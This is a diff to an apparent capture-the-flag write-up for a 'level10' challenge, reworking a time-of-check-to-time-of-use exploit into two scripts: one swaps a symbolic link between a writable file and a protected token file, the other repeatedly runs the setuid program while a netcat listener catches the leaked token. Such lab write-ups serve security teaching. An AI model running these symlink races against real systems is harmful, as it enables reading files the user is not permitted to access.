@@ -29,7 +29,7 @@ The key vulnerability is the time gap between the permission check (`access()`) 
 touch /tmp/myfile
 chmod 777 /tmp/myfile
 
-nano /tmp/run.sh
+nano /tmp/switcher.sh
 ```
 
 ```bash
@@ -38,9 +38,6 @@ nano /tmp/run.sh
 while true; do
   # Switch the symbolic link to /tmp/myfile
   ln -sf /tmp/myfile /tmp/linkfile
-
-  # Run the level10 program
-  /home/user/level10/level10 /tmp/linkfile 127.0.0.1
 
   # Switch the symbolic link to the token file
   ln -sf /home/user/level10/token /tmp/linkfile
@@ -53,7 +50,17 @@ done
 - `-f`: Force flag. If the target file already exists, remove it before creating the link. This prevents error messages about files already existing.
 
 ```bash
-chmod +x /tmp/run.sh
+nano /tmp/runner.sh
+
+while true; do
+  # Run the level10 program
+  /home/user/level10/level10 /tmp/linkfile 127.0.0.1
+done
+```
+
+```bash
+chmod +x /tmp/switcher.sh
+chmod +x /tmp/runner.sh
 ```
 
 ### Step 2: Set up a listener and run the scripts
@@ -65,7 +72,10 @@ In three separate terminals, run:
 nc -kl 6969
 
 # Terminal 2: Run the program repeatedly
-/tmp/run.sh
+/tmp/runner.sh
+
+# Terminal 3: Switch the links repeatedly
+/tmp/switcher.sh
 ```
 
 - `nc` is the netcat utility, a versatile networking tool
